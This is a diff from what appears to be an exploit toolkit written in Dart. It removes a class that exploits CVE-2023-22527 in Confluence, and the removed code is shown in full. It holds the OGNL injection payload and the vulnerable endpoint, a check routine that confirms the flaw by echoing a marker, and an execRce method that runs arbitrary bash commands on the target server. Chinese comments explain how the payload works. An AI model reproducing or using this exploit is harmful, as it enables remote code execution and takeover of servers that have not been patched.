@@ -109,68 +109,6 @@ class SolrExpService {
   }
 }
 
-class ConfluenceExpService {
-  final String baseUrl;
-  final Duration timeout;
-
-  ConfluenceExpService({
-    required this.baseUrl,
-    this.timeout = const Duration(seconds: 10),
-  });
-
-  String get _base =>
-      baseUrl.endsWith('/') ? baseUrl.substring(0, baseUrl.length - 1) : baseUrl;
-
-  // label 是 Velocity 模板注入点，必须携带完整的 OGNL 上下文建立 payload，
-  // x 参数才会被 findValue 作为 OGNL 表达式执行。
-  static const _labelPayload =
-      "'+#request['.KEY_velocity.struts2.context'].internalGet('ognl').findValue(#parameters.x[0],{})";
-
-  Future<ExpResult> check() async {
-    try {
-      final res = await http
-          .post(
-            Uri.parse('$_base/template/aui/text-inline.vm'),
-            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
-            body: {
-              'label': _labelPayload,
-              'x': '@freemarker.template.utility.Execute@exec({"echo","confluence_54289"})',
-            },
-          )
-          .timeout(timeout);
-      if (res.body.contains('confluence_54289')) {
-        return ExpResult(true, 'CVE-2023-22527', 'OGNL 注入验证通过，回显 confluence_54289');
-      }
-      if (res.statusCode == 200 || res.statusCode == 400) {
-        return ExpResult(
-          true,
-          'CVE-2023-22527',
-          '端点可访问 (${res.statusCode})，OGNL 注入可能存在',
-        );
-      }
-    } catch (_) {}
-    return const ExpResult(false, 'CVE-2023-22527', '');
-  }
-
-  Future<String?> execRce(String cmd) async {
-    try {
-      final escaped = RceEncoder.escapeDoubleQuoted(cmd);
-      final res = await http
-          .post(
-            Uri.parse('$_base/template/aui/text-inline.vm'),
-            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
-            body: {
-              'label': _labelPayload,
-              'x': '@freemarker.template.utility.Execute@exec({"bash","-c","$escaped"})',
-            },
-          )
-          .timeout(timeout);
-      return res.body.isNotEmpty ? res.body : null;
-    } catch (_) {
-      return null;
-    }
-  }
-}
 
 class DrupalExpService {
   final String baseUrl;
